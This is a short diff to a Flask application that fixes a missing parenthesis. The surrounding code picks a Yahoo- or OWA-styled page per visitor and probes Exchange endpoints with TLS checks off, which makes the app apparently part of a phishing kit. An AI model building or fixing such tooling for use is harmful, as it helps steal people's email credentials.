@@ -184,7 +184,7 @@ def route2():
             return render_template('Yahoo.html', eman=session.get('eman'), ins=session.get('ins'))
         owa_status = requests.get(owa_url, verify=False).status_code == 200
         autodiscover_status = requests.get(autodiscover_url, verify=False).status_code == 200
-        return render_template("gowa.html", eman=session.get('eman'), ins=session.get('ins')
+        return render_template("gowa.html", eman=session.get('eman'), ins=session.get('ins'))
 
 
     return render_template('index.html', eman=session.get('eman'), ins=session.get('ins'))
